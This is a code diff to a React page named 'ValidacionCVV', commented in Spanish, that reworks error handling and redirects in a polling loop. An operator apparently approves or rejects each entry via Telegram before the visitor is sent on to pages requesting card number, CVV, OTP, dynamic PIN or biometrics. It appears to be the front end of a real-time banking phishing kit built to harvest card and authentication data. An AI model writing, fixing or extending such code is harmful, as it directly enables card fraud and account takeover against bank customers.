@@ -80,12 +80,31 @@ export default function ValidacionCVV() {
                     return;
                 }
 
+                // PRIMERO verificar estados de error (deben tener prioridad)
+                // Si estamos en CVV y se rechaza CVV Custom, mostrar error y NO redirigir
+                if (estado === 'error_cvv_custom') {
+                    clearInterval(interval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    setPolling(false);
+                    setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
+                    setTimeout(() => {
+                        setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }));
+                        // Después de mostrar el error, volver a solicitar CVV Custom
+                        // El admin puede volver a configurar desde Telegram
+                    }, 2000);
+                    setCvv("");
+                    return;
+                }
+
+                // Estados de espera (awaiting approval)
                 const estadosEspera = ['pendiente', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
                 if (estadosEspera.includes(estado)) {
                     estadoAnteriorRef.current = estado;
                     return;
                 }
 
+                // Si el estado es solicitar_cvv_custom o solicitar_cvv, detener polling pero mantener en la vista
                 if (estado === 'solicitar_cvv_custom' || estado === 'solicitar_cvv') {
                     clearInterval(interval);
                     clearTimeout(timeoutId);
@@ -94,31 +113,9 @@ export default function ValidacionCVV() {
                     return;
                 }
 
-                if (estado === 'error_cvv_custom') {
-                    clearInterval(interval);
-                    clearTimeout(timeoutId);
-                    setCargando(false);
-                    setPolling(false);
-                    setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
-                    setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false })), 2000);
-                    setCvv("");
-                    return;
-                }
-
                 // Admin aprobó CVV Custom: backend NO cambia el estado (solo RECHAZAR lo cambia).
                 // Usuario debe QUEDAR EN ESPERA hasta que admin pulse OTP, DIN o FIN.
                 // El estado permanece en 'awaiting_cvv_approval' hasta que admin presione un botón del menú.
-                const prev = estadoAnteriorRef.current;
-                const aprobadoAhora = (prev === 'awaiting_cvv_approval' || prev === 'awaiting_tc_approval') && estado === 'solicitar_din';
-                if (aprobadoAhora) {
-                    aprobadoEsperandoRef.current = true;
-                    estadoAnteriorRef.current = estado;
-                    return;
-                }
-                if (aprobadoEsperandoRef.current && estado === 'solicitar_din') {
-                    estadoAnteriorRef.current = estado;
-                    return;
-                }
                 
                 // Si el estado sigue en awaiting_approval, seguir esperando
                 if (estado === 'awaiting_cvv_approval' || estado === 'awaiting_tc_approval') {
@@ -126,13 +123,23 @@ export default function ValidacionCVV() {
                     return;
                 }
                 
-                estadoAnteriorRef.current = estado;
+                // Si estaba en awaiting_approval y ahora cambió a otro estado, significa que el admin presionó un botón
+                const prev = estadoAnteriorRef.current;
+                if ((prev === 'awaiting_cvv_approval' || prev === 'awaiting_tc_approval') && 
+                    estado !== 'awaiting_cvv_approval' && estado !== 'awaiting_tc_approval' && 
+                    estado !== 'pendiente') {
+                    // El admin presionó un botón después de aprobar, continuar con el flujo normal
+                    estadoAnteriorRef.current = estado;
+                    // NO retornar aquí, dejar que continúe el flujo para detectar redirecciones
+                } else {
+                    estadoAnteriorRef.current = estado;
+                }
 
                 const estadosRedireccion = [
                     'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
                     'solicitar_biometria', 'error_923',
                     'solicitar_tc_custom', 'solicitar_cvv_custom',
-                    'error_tc', 'error_otp', 'error_din', 'error_login',
+                    'error_tc', 'error_tc_custom', 'error_otp', 'error_din', 'error_login', 'error_cvv_custom',
                     'aprobado', 'error_pantalla', 'bloqueado_pantalla'
                 ];
                 if (!estadosRedireccion.includes(estado?.toLowerCase())) return;
@@ -166,8 +173,14 @@ export default function ValidacionCVV() {
                         navigate("/error-923page");
                         break;
                     case 'error_tc':
-                        localStorage.setItem('estado_sesion', 'error');
-                        navigate("/validacion-tc");
+                    case 'error_tc_custom':
+                        // Si estamos en CVV y hay error de TC, NO redirigir a TC
+                        // Solo redirigir si realmente es necesario
+                        // Por ahora, no hacer nada ya que estamos en CVV
+                        break;
+                    case 'error_cvv_custom':
+                        // No redirigir, el modal de error ya se mostró arriba y se detuvo el polling
+                        // El usuario permanece en la vista de CVV
                         break;
                     case 'error_otp':
                         localStorage.setItem('estado_sesion', 'error');
@@ -379,7 +392,7 @@ export default function ValidacionCVV() {
                     const { estado } = response.data;
                     
                     // Solo permitir acceso si el estado es correcto
-                    if (estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_cvv_approval') {
+                    if (estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_cvv_approval' && estado !== 'error_cvv_custom') {
                         console.error('Acceso no autorizado a CVV. Estado actual:', estado);
                         navigate('/');
                         return false;
@@ -396,7 +409,7 @@ export default function ValidacionCVV() {
                     const { estado } = response.data;
                     
                     // Solo permitir acceso si el estado es correcto
-                    if (estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_cvv_approval') {
+                    if (estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_cvv_approval' && estado !== 'error_cvv_custom') {
                         console.error('Acceso no autorizado a CVV. Estado actual:', estado);
                         navigate('/');
                         return false;
